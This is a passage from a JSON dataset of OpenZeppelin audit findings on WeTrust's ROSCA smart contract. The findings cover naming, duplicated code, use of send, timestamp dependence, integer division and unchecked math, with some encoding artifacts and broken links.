        "OpenZeppelin"
      ]
    },
    {
      "id": "12148",
      "title": "Naming suggestions",
      "impact": "LOW",
      "content": "* The **members\\_** constructor parameter could be confused as the full set of members, and it is in fact al members but the contract creator. Consider calling it **otherMembers\\_** or something like so, to avoid this confusion.\n* The **grossTotalFees** uint256 variable [in recalculateTotalFees](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L300) is not really the gross total fees, because itâ€™s never multiplied by the service fee per mille. Consider renaming it to **grossTotal** or something like so, to avoid confusion.\n* The **totalDiscounts** uint256 contract variable does not represent the total discounts, but the discounts per member. Consider renaming to **discountPerMember** to avoid confusion.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract codeÂ audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12147",
      "title": "Avoid duplicated code",
      "impact": "LOW",
      "content": "Duplicate code makes it harder to understand the codeâ€™s intention and thus, auditing the code correctly. It also increases the risk of introducing hidden bugs when modifying one of the copies of some code and not the others.\n\n\nThe logic in [getParticipantBalance()](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L441) and [the start of withdraw()](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L406-L418) is very similar and could be refactored to avoid repetition. Consider using getParticipantBalance in withdraw.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract codeÂ audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12146",
      "title": "totalFees will always be 0 on LogFundsWithdrawal",
      "impact": "LOW",
      "content": "In [line 502 of ROSCA.sol](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L502), a **LogFundsWithdrawal** event is emitted if the send does not fail. The problem is that the variable `totalFees` will always be 0, as it is set to 0 [in line 495](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L495)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract codeÂ audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12145",
      "title": "Bug Bounty",
      "impact": "LOW",
      "content": "Formal security audits are not enough to be safe. We recommend implementing [an automated contract-based bug bounty](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/Bounty.sol)[see this guide](https://zeppelin-solidity.readthedocs.io/en/latest/bounty.html)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract codeÂ audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12144",
      "title": "Usage of magic constants",
      "impact": "LOW",
      "content": "There are several [magic constants](https://en.wikipedia.org/wiki/Magic_number_%28programming%29)\n\n\n* <https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L341>\n* <https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L389>\n\n\nUse of magic constants reduces code readability and makes it harder to understand code intention. We recommend extracting magic constants into contract constants.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract codeÂ audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12143",
      "title": "Use ofÂ send",
      "impact": "LOW",
      "content": "Use of **send** is always risky and should be analyzed in detail. Three occurrences found in [line 427](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L427), [â€œ>line 476](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L476%22), and[line 496](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L496) of ROSCA.sol.\n\n\n* [Always check send return value](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#c528): OK.\n* [Consider calling send at the end of the function](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#3d17): OK.\n* [Favor pull payments over push payments](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#fa61): Warning. All 3 occurrences of send are push payments. Although we couldnâ€™t find any attack vectors on this contract, consider using [OpenZeppelinâ€™s PullPayment contract](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/payment/PullPayment.sol) to implement pull payments in ROSCA.sol.\n\n\nFor more info on this problem,[see this note](https://github.com/ConsenSys/Ethereum-Development-Best-Practices/wiki/Fallback-functions-and-the-fundamental-limitations-of-using-send%28%29-in-Ethereum-&-Solidity#abuse).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract codeÂ audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12142",
      "title": "Timestamp usage",
      "impact": "MEDIUM",
      "content": "Thereâ€™s a problem with using timestamps and **now** (alias for **block.timestamp**) for contract logic, based on the fact that miners can perform some manipulation. In general,[itâ€™s better not to rely on timestamps for contract logic](https://github.com/ConsenSys/smart-contract-best-practices#timestamp-dependence). The solutions is to use **block.number** instead, and approximate dates with expected block heights and time periods with expected block amounts.\n\n\nThe ROSCA.sol contract uses timestamps at [several](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L198) [pointsâ€>The risk of miner manipulation, though, is really low. The potential damage is also limited: miners could only slightly manipulate when each round starts and who the winner is in each round.](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L258%22). As [this comment notes](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L256%22), this wonâ€™t affect the functioning of the contract, but the miner of the **cleanUpPreviousRound** call transaction will have absolute control on who the next winner is. We recommend the team to consider the potential risk of this manipulation and switch to **block.number** if necessary.\n\n\nFor more info on this topic, see [this stack exchange question](https://ethereum.stackexchange.com/questions/413/can-a-contract-safely-rely-on-block-timestamp)",
      "summary": "\nThis bug report is about the potential manipulation of timestamps and now (alias for block.timestamp) by miners in a smart contract. It is better not to rely on timestamps for contract logic as miners can manipulate them. The ROSCA.sol contract uses timestamps at several points and the potential damage is limited as miners can only slightly manipulate when each round starts and who the winner is. It is recommended to switch to block.number instead to avoid the potential risk of manipulation. For more information on this topic, a stack exchange question is linked.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract codeÂ audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12141",
      "title": "Be careful with integerÂ division",
      "impact": "MEDIUM",
      "content": "Several parts of the code use integer division. See [1](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L288),[2](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L316), [3](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L341), [4](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L381), [5](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L389/). Integer division result will discard the remainder and keep the quotient. This could bring unexpected results in some cases.\n\n\nFor example, in [line 288](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L288), if **currentRoundTotalDiscounts** is not a multiple of **membersAddresses.length**, **totalDiscounts**will be incremented by the quotient, and the remainder of the division will not be considered.\n\n\nWe havenâ€™t detected any actual attacks or inconsistencies in the contract due to this fact, but we recommend being extra careful. In this case, a solution could be to make **totalDiscounts** have the total amount of discounts instead of the discounts per member.",
      "summary": "\nThis bug report is about the use of integer division in several parts of the code. Integer division discards the remainder and keeps the quotient, which can lead to unexpected results. An example of this is in line 288, if the currentRoundTotalDiscounts is not a multiple of membersAddresses.length, totalDiscounts will be incremented by the quotient, and the remainder of the division will not be considered. While no actual attacks or inconsistencies have been found, it is recommended to take extra caution. A potential solution could be making totalDiscounts have the total amount of discounts instead of the discounts per member.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract codeÂ audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12140",
      "title": "Use safeÂ math",
      "impact": "MEDIUM",
      "content": "There are many unchecked math operations in the code. Itâ€™s always better to be safe and perform checked operations. Consider [using a safe math library](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/SafeMath.sol#L6), or performing pre-condition checks on any math operation.",
      "summary": "\nThis bug report is about unchecked math operations in the code. It is important to perform checked operations to ensure safety. A safe math library like OpenZeppelin's SafeMath library can be used, or pre-condition checks on any math operation can be performed. This is to prevent any issues that may arise from unchecked math operations in the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract codeÂ audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    }
  ]
}